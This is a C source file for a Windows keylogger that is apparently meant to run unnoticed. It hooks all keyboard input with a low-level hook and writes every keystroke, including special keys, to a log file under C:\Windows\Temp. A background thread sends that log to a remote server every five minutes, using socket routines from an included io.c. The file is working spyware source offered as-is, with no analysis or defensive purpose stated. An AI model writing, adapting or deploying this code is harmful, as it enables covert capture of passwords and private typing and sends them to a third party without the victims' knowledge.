#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <time.h>

#include "io.c"

#pragma comment(lib, "user32.lib")


// Define global hook
HHOOK hHook = NULL;

// Define thread handle
HANDLE h_thread;
// Declare time stuff

int get_time(void)
{
	time_t current_time;
	current_time = time(NULL);
	struct tm *tm_struct = localtime(&current_time);
	
	int min = tm_struct->tm_min;
	return min;
}

// connect to server
DWORD WINAPI thread_func(LPVOID lpParam)
{
	int ctime 	= 0;
	int r		= 0;
	
	while(1)
	{
		ctime = get_time();	
		if((ctime % 5) == 0)
		{
			socket_setup();
			if (socket_connect() == 0)
			{
				socket_sendfile();
			}

			socket_cleanup();
		}
		Sleep(59000);
	}
	return 0;
}

// Define Callback function 
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	BYTE boardstate[256]	= {0};
	WORD cbuff[2] 		= {0}; 

	// set file pointer
	FILE *fpointer;
	
	// open file
	fpointer = fopen("C:\\Windows\\Temp\\log.txt", "a");
	
	// error handling
	if (fpointer == NULL)
	{
		// in case of failure, call next hook
		return CallNextHookEx(hHook, nCode, wParam, lParam);
		
	}

	KBDLLHOOKSTRUCT *key = (KBDLLHOOKSTRUCT *) lParam; 
	
	// Only record on down press
	if(wParam == WM_KEYDOWN)
	{
		switch (key->vkCode)
		{
		case 0x08:
			fprintf(fpointer, "[b]");
			break;
		case 0x09:
			fprintf(fpointer, "[t]");
			break;
		case 0x0D:
			fprintf(fpointer, "\n");
			break;
		case 0xA0:
			fprintf(fpointer, "[s]");
			break;
		case 0xA1:
			fprintf(fpointer, "[s]");
		case 0xA2:
			fprintf(fpointer, "[ct]");
			break;
		case 0xA3:
			fprintf(fpointer, "[ct]");
			break;
		case 0x12:
			fprintf(fpointer, "[a]");
			break;
		case 0x14:
			fprintf(fpointer, "[c]");
			break;
		case 0x20:
			fprintf(fpointer, " ");
			break;
		case 0x2E:
			fprintf(fpointer, "[d]");
			break;
		case 0x25:
			fprintf(fpointer, "[L]");
			break;
		case 0x26:
		       	fprintf(fpointer, "[U]");
			break;
		case 0x27:
			fprintf(fpointer, "[R]");
			break;
		case 0x28:
			fprintf(fpointer, "[D]");
			break;
		case 0x5B:
			fprintf(fpointer, "[Win]");
			break;	
		case 0x5C:
			fprintf(fpointer, "[Win]");
			break;	
		case 0x5D:
			fprintf(fpointer, "[Apps]");
			break;
		default: 
			if(ToAscii((UINT)key->vkCode, (UINT)key->scanCode, boardstate, cbuff, 0) == 1)
			{
				// print whatever is in the buffer
				fprintf(fpointer, "%ws", cbuff); 
			}

			else
			{
				fprintf(fpointer, "[Error]");
			}
		}
	}
	// to let me know when special keys have been released 
	if(wParam == WM_KEYUP)
	{
		switch (key->vkCode)
		{
		case 0xA0:
			fprintf(fpointer, "[/s]");
			break;
		case 0xA1:
			fprintf(fpointer, "[/s]");
		case 0xA2:
			fprintf(fpointer, "[/ct]");
			break;
		case 0xA3:
			fprintf(fpointer, "[/ct]");
			break;
		case 0x12:
			fprintf(fpointer, "[/a]");
			break;
		default: break;
		}
	}
	// close the file pointer
	fclose(fpointer);
	
	// By definition, you have to return CallNextHookEx
	return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow)
{
	// Set Windows Hook
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
	
	// Make sure that hook is set
	if(hHook == NULL)
	{
		// exit if we dont have the hook
		return 1;
	}
	
	// Create second thread
	h_thread = CreateThread(NULL, 0, &thread_func, NULL, 0, NULL);
	
	if(h_thread == NULL)
	{
		return 1;
	}
	
	// Enter message loop
	MSG msg;
	while(GetMessage(&msg, NULL, 0, 0))
	{
	
	}

	return 0;
}
